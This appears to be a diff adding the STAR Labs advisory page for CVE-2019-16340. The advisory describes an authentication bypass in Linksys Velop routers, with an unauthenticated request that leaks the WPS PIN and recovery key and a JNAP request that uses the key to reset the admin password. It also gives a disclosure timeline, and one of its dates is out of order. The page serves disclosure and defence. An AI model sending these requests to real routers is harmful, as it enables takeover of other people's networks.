@@ -1,0 +1,384 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>(CVE-2019-16340) Linksys Velop Authentication Bypass | STAR Labs</title>
+<meta name="keywords" content="">
+<meta name="description" content="CVE: CVE-2019-16340
+Tested Versions:
+ Linksys Velop 1.1.2.185309  Product URL(s): https://www.linksys.com/us/velop/
+Velop is a WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users to enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
+There are three categories from their official site: WHW0303, WHW0302, WHW0301.
+The differences between these three are the pack count: 1, 2 or 3. The system is the same.
+Vulnerability There are many information leak problems; one of them is through /sysinfo_json.">
+<meta name="author" content="Shi Ji (@Puzzorsj)">
+<link rel="canonical" href="https://starlabs.sg/advisories/19/19-16340/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
+<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
+<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="(CVE-2019-16340) Linksys Velop Authentication Bypass" />
+<meta property="og:description" content="CVE: CVE-2019-16340
+Tested Versions:
+ Linksys Velop 1.1.2.185309  Product URL(s): https://www.linksys.com/us/velop/
+Velop is a WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users to enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
+There are three categories from their official site: WHW0303, WHW0302, WHW0301.
+The differences between these three are the pack count: 1, 2 or 3. The system is the same.
+Vulnerability There are many information leak problems; one of them is through /sysinfo_json." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://starlabs.sg/advisories/19/19-16340/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
+<meta property="article:published_time" content="2019-02-19T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2019-02-19T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>
+
+<meta name="twitter:title" content="(CVE-2019-16340) Linksys Velop Authentication Bypass"/>
+<meta name="twitter:description" content="CVE: CVE-2019-16340
+Tested Versions:
+ Linksys Velop 1.1.2.185309  Product URL(s): https://www.linksys.com/us/velop/
+Velop is a WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users to enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
+There are three categories from their official site: WHW0303, WHW0302, WHW0301.
+The differences between these three are the pack count: 1, 2 or 3. The system is the same.
+Vulnerability There are many information leak problems; one of them is through /sysinfo_json."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Advisories",
+      "item": "https://starlabs.sg/advisories/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "(CVE-2019-16340) Linksys Velop Authentication Bypass",
+      "item": "https://starlabs.sg/advisories/19/19-16340/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "(CVE-2019-16340) Linksys Velop Authentication Bypass",
+  "name": "(CVE-2019-16340) Linksys Velop Authentication Bypass",
+  "description": "CVE: CVE-2019-16340\nTested Versions:\n Linksys Velop 1.1.2.185309  Product URL(s): https://www.linksys.com/us/velop/\nVelop is a WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users to enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.\nThere are three categories from their official site: WHW0303, WHW0302, WHW0301.\nThe differences between these three are the pack count: 1, 2 or 3. The system is the same.\nVulnerability There are many information leak problems; one of them is through /sysinfo_json.",
+  "keywords": [
+    
+  ],
+  "articleBody": "CVE: CVE-2019-16340\nTested Versions:\n Linksys Velop 1.1.2.185309  Product URL(s): https://www.linksys.com/us/velop/\nVelop is a WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users to enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.\nThere are three categories from their official site: WHW0303, WHW0302, WHW0301.\nThe differences between these three are the pack count: 1, 2 or 3. The system is the same.\nVulnerability There are many information leak problems; one of them is through /sysinfo_json.cgi, requesting this URL will leak sensitive information and may lead to authentication bypass.\nWe can get some helpful information from the PoC below:\nGET /sysinfo_json.cgi HTTP/1.1 Host: 10.158.1.1 Accept: application/json; charset=UTF-8 Expires: Fri, 10 Oct 2015 14:19:41 GMT Accept-Encoding: gzip, deflate Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9 Cache-Control: no-cache Content-Type: application/json; charset=UTF-8 User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00) Connection: close Response:\nHTTP/1.1 200 OK Connection: close CONTENT-LANGUAGE: en Date: Thu, 11 Oct 2012 11:09:15 GMT Server: lighttpd/1.4.39 Content-Length: 94710 siSections=\"MfgData,BootData,Syscfg,Sysevent,Messages,Dmesg,Ps,MemoryInfo,CpuInfo,WifiBasicInfo,WifiRadioInfo,WifiClientInfo,WifiPoorClientInfo,WifiLegacyClientInfo,WifiAllAPInfo,WifiSameAPInfo,WifiAllCAInfo,WifiMyCAInfo,IPInfo,PingInfo,Conntrack,ConntrackTotals,ConntrackAvg,Thrulay\"; var MfgData = { \"title\": \"Manufacturer Data\", \"description\": \"This is used to manufacturer unit and in SKU API\", \"timestamp\": \"16:01:02.12/31/69\", \"data\": [ { ....... \"wps_pin\": \"wps_device_pin = 58163597\", ....... \"device_recovery_key\": \"84667\", ....... } ] }; ...... The most important value we can get is WPS PIN and Device Recovery Key. For the WPS PIN, we can use it to connect to the Wi-Fi even if the Wi-Fi password is changed when WPS is enabled. A recovery key can be used to reset the admin password. We may construct the following request to change the admin password:\nPOST /JNAP/ HTTP/1.1 Host: 192.168.1.1 Accept: application/json; charset=UTF-8 Expires: Fri, 10 Oct 2015 14:19:41 GMT Accept-Encoding: gzip, deflate Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9 Cache-Control: no-cache Content-Type: application/json; charset=UTF-8 Content-Length: 48 User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00) Connection: close X-JNAP-Action: http://linksys.com/jnap/nodes/setup/SetAdminPassword {\"resetCode\":\"84667\",\"adminPassword\":\"test1234\"} By sending this request to the router, we can successfully change the administration password to test1234.\nThe crucial part of this vulnerability is that we can request resources by JNAP protocol, but we can also craft an HTTP request. The server doesn’t restrict proper resource, which leads to a sensitive information leak.\nA proper request should with X-JNAP-Authorization header like below:\nPOST /JNAP/ HTTP/1.1 Host: 10.158.1.1 Accept: application/json; charset=UTF-8 Expires: Fri, 10 Oct 2015 14:19:41 GMT X-JNAP-Authorization: Basic YWRtaW46YWRtaW4= Accept-Encoding: gzip, deflate Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9 Cache-Control: no-cache Content-Type: application/json; charset=UTF-8 Content-Length: 178 User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00) Connection: close X-JNAP-Action: http://linksys.com/jnap/core/Transaction [{\"request\":{\"sinceRevision\":0},\"action\":\"http:\\/\\/linksys.com\\/jnap\\/devicelist\\/GetDevices3\"},{\"request\":{},\"action\":\"http:\\/\\/linksys.com\\/jnap\\/router\\/GetDHCPClientLeases\"}] We highly recommend that end users to disallow request to /sysinfo_json.cgi, or check whether there is a correct authorization header in HTTP request.\nTimeline:  2019-06-22 Vendor disclosure 2019-02-26 Vendor acknowledged the problem and reproduced it 2019-05-31 We asked vendor if there are any updates. No response 2019-06-06 We asked vendor if there are any updates 2019-06-06 Vendor replied “Apologies for the delay in response; the engineering team informs me that a firmware release for Velop will be released later this month. Would you like a preview of this firmware to confirm our fix?” 2019-06-06 We replied No 2019-07-26 Vendor replied “We are starting a limited rollout of the release starting tonight and if all goes well, the full release will be opened up in the first week of August. Thank you!” 2019-08-21 We asked vendor if there are any updates 2019-08-23 Vendor replied as “We have finally released a fix to address this issue. https://www.linksys.com/us/support-article?articleNum=207568. We have not applied for a CVE and do not have any plans to do so. Thank you!” 2019-08-26 We asked if we could apply a CVE for this issue 2019-08-27 Vendor replied:we have no objections if you’d like to file for a CVE.  ",
+  "wordCount" : "591",
+  "inLanguage": "en",
+  "datePublished": "2019-02-19T00:00:00Z",
+  "dateModified": "2019-02-19T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Shi Ji (@Puzzorsj)"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://starlabs.sg/advisories/19/19-16340/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "STAR Labs",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://starlabs.sg/logo-white.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
+                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
+                    height="35"> </a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://starlabs.sg/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/advisories/" title="Advisories">
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/publications/" title="Publications">
+                    <span>Publications</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
+    <h1 class="post-title">
+      (CVE-2019-16340) Linksys Velop Authentication Bypass
+    </h1>
+    <div class="post-meta"><span title='2019-02-19 00:00:00 +0000 UTC'>February 19, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;Shi Ji (@Puzzorsj)
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>CVE</strong>: CVE-2019-16340</p>
+<p><strong>Tested Versions</strong>:</p>
+<ul>
+<li>Linksys Velop 1.1.2.185309</li>
+</ul>
+<p><strong>Product URL(s)</strong>: <a href="https://www.linksys.com/us/velop/">https://www.linksys.com/us/velop/</a></p>
+<p>Velop is a WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users to enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.</p>
+<p>There are three categories from their <a href="https://www.linksys.com/us/c/whole-home-mesh-wifi/">official site</a>: WHW0303, WHW0302, WHW0301.</p>
+<p>The differences between these three are the pack count: 1, 2 or 3. The system is the same.</p>
+<h1 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h1>
+<p>There are many information leak problems; one of them is through <strong><code>/sysinfo_json.cgi</code></strong>, requesting this URL will leak sensitive information and may lead to authentication bypass.</p>
+<p>We can get some helpful information from the PoC below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/sysinfo_json.cgi</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.158.1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">application/json; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Expires</span><span class="o">:</span> <span class="l">Fri, 10 Oct 2015 14:19:41 GMT</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-Hans-CN;q=1, en-CN;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">CONTENT-LANGUAGE</span><span class="o">:</span> <span class="l">en</span>
+</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="o">:</span> <span class="l">Thu, 11 Oct 2012 11:09:15 GMT</span>
+</span></span><span class="line"><span class="cl"><span class="n">Server</span><span class="o">:</span> <span class="l">lighttpd/1.4.39</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">94710</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="g">siSections=&#34;MfgData,BootData,Syscfg,Sysevent,Messages,Dmesg,Ps,MemoryInfo,CpuInfo,WifiBasicInfo,WifiRadioInfo,WifiClientInfo,WifiPoorClientInfo,WifiLegacyClientInfo,WifiAllAPInfo,WifiSameAPInfo,WifiAllCAInfo,WifiMyCAInfo,IPInfo,PingInfo,Conntrack,ConntrackTotals,ConntrackAvg,Thrulay&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="g">var MfgData = {
+</span></span></span><span class="line"><span class="cl"><span class="g"> &#34;title&#34;: &#34;Manufacturer Data&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g"> &#34;description&#34;: &#34;This is used to manufacturer unit and in SKU API&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g"> &#34;timestamp&#34;: &#34;16:01:02.12/31/69&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g"> &#34;data&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="g">{
+</span></span></span><span class="line"><span class="cl"><span class="g">.......
+</span></span></span><span class="line"><span class="cl"><span class="g"> &#34;wps_pin&#34;: &#34;wps_device_pin = 58163597&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g">.......
+</span></span></span><span class="line"><span class="cl"><span class="g">&#34;device_recovery_key&#34;: &#34;84667&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g">.......
+</span></span></span><span class="line"><span class="cl"><span class="g"> }
+</span></span></span><span class="line"><span class="cl"><span class="g"> ]
+</span></span></span><span class="line"><span class="cl"><span class="g">};
+</span></span></span><span class="line"><span class="cl"><span class="g">......
+</span></span></span></code></pre></div><p>The most important value we can get is WPS PIN and Device Recovery Key. For the WPS PIN, we can use it to connect to the Wi-Fi even if the Wi-Fi password is changed when WPS is enabled. A recovery key can be used to reset the admin password. We may construct the following request to change the admin password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/JNAP/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">application/json; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Expires</span><span class="o">:</span> <span class="l">Fri, 10 Oct 2015 14:19:41 GMT</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-Hans-CN;q=1, en-CN;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">48</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-JNAP-Action</span><span class="o">:</span> <span class="l">http://linksys.com/jnap/nodes/setup/SetAdminPassword</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;resetCode&#34;</span><span class="p">:</span><span class="s2">&#34;84667&#34;</span><span class="p">,</span><span class="nt">&#34;adminPassword&#34;</span><span class="p">:</span><span class="s2">&#34;test1234&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>By sending this request to the router, we can successfully change the administration password to test1234.</p>
+<p>The crucial part of this vulnerability is that we can request resources by JNAP protocol, but we can also craft an HTTP request. The server doesn&rsquo;t restrict proper resource, which leads to a sensitive information leak.</p>
+<p>A proper request should with X-JNAP-Authorization header like below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/JNAP/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.158.1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">application/json; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Expires</span><span class="o">:</span> <span class="l">Fri, 10 Oct 2015 14:19:41 GMT</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-JNAP-Authorization</span><span class="o">:</span> <span class="l">Basic YWRtaW46YWRtaW4=</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-Hans-CN;q=1, en-CN;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">178</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-JNAP-Action</span><span class="o">:</span> <span class="l">http://linksys.com/jnap/core/Transaction</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[{</span><span class="nt">&#34;request&#34;</span><span class="p">:{</span><span class="nt">&#34;sinceRevision&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">},</span><span class="nt">&#34;action&#34;</span><span class="p">:</span><span class="s2">&#34;http:\/\/linksys.com\/jnap\/devicelist\/GetDevices3&#34;</span><span class="p">},{</span><span class="nt">&#34;request&#34;</span><span class="p">:{},</span><span class="nt">&#34;action&#34;</span><span class="p">:</span><span class="s2">&#34;http:\/\/linksys.com\/jnap\/router\/GetDHCPClientLeases&#34;</span><span class="p">}]</span>
+</span></span></code></pre></div><p>We highly recommend that end users to disallow request to <strong><code>/sysinfo_json.cgi</code></strong>, or check whether there is a correct authorization header in HTTP request.</p>
+<h1 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h1>
+<ul>
+<li>2019-06-22 Vendor disclosure</li>
+<li>2019-02-26 Vendor acknowledged the problem and reproduced it</li>
+<li>2019-05-31 We asked vendor if there are any updates. No response</li>
+<li>2019-06-06 We asked vendor if there are any updates</li>
+<li>2019-06-06 Vendor replied &ldquo;Apologies for the delay in response; the engineering team informs me that a firmware release for Velop will be released later this month. Would you like a preview of this firmware to confirm our fix?&rdquo;</li>
+<li>2019-06-06 We replied No</li>
+<li>2019-07-26 Vendor replied &ldquo;We are starting a limited rollout of the release starting tonight and if all goes well, the full release will be opened up in the first week of August. Thank you!&rdquo;</li>
+<li>2019-08-21 We asked vendor if there are any updates</li>
+<li>2019-08-23 Vendor replied as &ldquo;We have finally released a fix to address this issue.   <a href="https://www.linksys.com/us/support-article?articleNum=207568">https://www.linksys.com/us/support-article?articleNum=207568</a>. We have not applied for a CVE and do not have any plans to do so. Thank you!&rdquo;</li>
+<li>2019-08-26 We asked if we could apply a CVE for this issue</li>
+<li>2019-08-27 Vendor replied:we have no objections if you&rsquo;d like to file for a CVE.</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://starlabs.sg/advisories/18/18-20336/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c</span>
+  </a>
+  <a class="next" href="https://starlabs.sg/advisories/19/19-7035/">
+    <span class="title">Next »</span>
+    <br>
+    <span>(CVE-2019-7035) Acrobat Reader DC 2d.x3d!_LoadGIF() Arbitrary Write in TGIF::PutPixel()</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
